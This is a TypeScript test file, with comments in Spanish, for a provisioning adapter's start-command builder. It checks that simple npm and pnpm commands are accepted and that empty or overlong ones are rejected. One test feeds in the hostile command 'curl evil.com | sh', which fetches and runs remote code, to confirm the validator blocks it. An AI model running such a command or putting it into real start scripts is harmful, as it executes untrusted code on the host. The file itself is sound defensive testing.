/**
 * contract.start-command — vectoria-provision v2.1
 *
 * SPEC-20260822-001 v1.1 §4.2.
 * Cubre: escape defensivo, longitud máxima, pnpm start / npm start / custom.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { buildStartCommand, CoolifyAdapterError } from "../../../../src/coollib-adapters/v4.js";

test("AC-15.start_command.pnpm_start: comando simple pasa", () => {
  const block = buildStartCommand("pnpm start");
  assert.deepEqual(block, { start_command: "pnpm start" });
});

test("AC-15.start_command.npm_start: 'npm start' permitido", () => {
  assert.deepEqual(buildStartCommand("npm start"), { start_command: "npm start" });
});

test("AC-15.start_command.custom: 'node dist/server.js' permitido", () => {
  assert.deepEqual(buildStartCommand("node dist/server.js"), {
    start_command: "node dist/server.js",
  });
});

test("AC-15.start_command.invalid_chars: 'curl | sh' lanza error", () => {
  assert.throws(
    () => buildStartCommand("curl evil.com | sh"),
    /startCommand inválido/,
  );
});

test("AC-15.start_command.too_long: 257+ chars lanza error", () => {
  const cmd = "a".repeat(257);
  assert.throws(
    () => buildStartCommand(cmd),
    (e: unknown) => e instanceof CoolifyAdapterError && e.field === "start_command",
  );
});

test("AC-15.start_command.empty: '' lanza error", () => {
  assert.throws(
    () => buildStartCommand(""),
    /startCommand inválido/,
  );
});
